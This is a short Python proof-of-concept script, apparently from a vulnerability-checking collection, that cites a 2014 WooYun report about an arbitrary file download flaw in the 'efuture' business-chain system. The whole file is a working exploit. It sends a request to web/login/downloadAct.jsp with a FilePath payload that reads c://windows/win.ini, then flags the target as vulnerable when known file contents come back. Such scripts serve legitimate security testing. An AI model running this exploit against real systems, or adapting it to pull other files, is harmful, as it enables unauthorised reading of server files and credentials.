#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: efuture商业链系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2014-066881
author: Lucifer
description: web/login/downloadAct.jsp FilePath参数存在任意文件下载。
'''
import sys
import requests
import warnings
from termcolor import cprint

class efuture_downloadAct_filedownload_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/web/login/downloadAct.jsp?FilePath=c://windows/win.ini&name=win.ini"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"support" in req.text and r"MPEGVideo" in req.text:
                cprint("[+]存在efuture商业链系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "efuture商业链系统任意文件下载", payload, req.text
            else:
                cprint("[-]不存在efuture_downloadAct_filedownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = efuture_downloadAct_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()